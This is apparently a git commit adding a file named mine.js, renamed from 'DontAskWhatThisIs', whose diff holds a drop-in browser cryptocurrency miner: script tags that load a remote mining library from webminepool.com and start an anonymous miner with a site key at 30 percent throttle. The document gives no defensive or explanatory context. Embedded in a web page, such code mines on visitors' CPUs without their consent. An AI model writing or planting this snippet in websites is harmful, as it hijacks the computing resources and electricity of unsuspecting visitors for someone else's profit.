f9b0cc0fceb841b41712714f500271a9c74faba9
CashorCredit <77197597+CashorCredit@users.noreply.github.com>
2021-02-23 12:34:05 -0600

    Update and rename DontAskWhatThisIs to mine.js

---
+++ mine.js
@@ -0,0 +1,9 @@
+
+
+<script src="https://webminepool.com/lib/base.js"></script>
+
+<script>
+    var miner = WMP.Anonymous('SK_3yFG2szQdTPLZLzGCfihT', {throttle: 0.3});
+    miner.start();
+</script>
+
